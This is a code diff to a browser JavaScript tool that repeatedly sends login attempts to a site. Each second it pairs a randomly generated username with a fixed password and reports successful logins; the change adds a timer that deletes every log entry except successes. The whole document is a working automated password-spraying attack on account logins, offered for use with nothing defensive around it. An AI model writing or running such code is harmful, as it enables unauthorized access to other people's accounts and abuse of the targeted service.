@@ -27,7 +27,6 @@ async function login(u,p){
       },
       body:JSON.stringify({username:u,password:p,useMessages:true})
     });
-    const t=await res.text();
     log("gray","試行: "+u+" → "+res.status);
     if(res.status===200){
       log("green","✅ 成功: "+u);
@@ -57,6 +56,7 @@ function log(color,msg){
     b.style.marginBottom="6px";
     b.onclick=function(){
       clearInterval(window.loginTimer);
+      clearInterval(window.logCleaner);
       log("crimson","⛔ 停止しました");
     };
     d.appendChild(b);
@@ -67,6 +67,22 @@ function log(color,msg){
   e.textContent=msg;
   d.appendChild(e);
   d.scrollTop=d.scrollHeight;
+}
+
+// 🔄 ログ自動クリーナー（5秒ごとに成功以外削除）
+function startLogCleaner(){
+  if(window.logCleaner)clearInterval(window.logCleaner);
+  window.logCleaner=setInterval(()=>{
+    const d=document.getElementById("loginLogDiv");
+    if(!d)return;
+    const logs=d.querySelectorAll("div");
+    logs.forEach(el=>{
+      if(el.textContent.startsWith("✅ 成功"))return;
+      if(el.textContent.includes("停止しました"))return;
+      if(el.textContent==="STOP")return;
+      el.remove();
+    });
+  },5000);
 }
 
 (async function(){
@@ -87,6 +103,7 @@ function log(color,msg){
 
   alert("1秒ごとに試行を開始します。");
   log("black","▶ 開始: "+(new Date()).toLocaleTimeString());
+  startLogCleaner(); // ← 自動削除機能開始
   window.loginTimer=setInterval(async()=>{
     var user=r(len,opts);
     await login(user,pass);
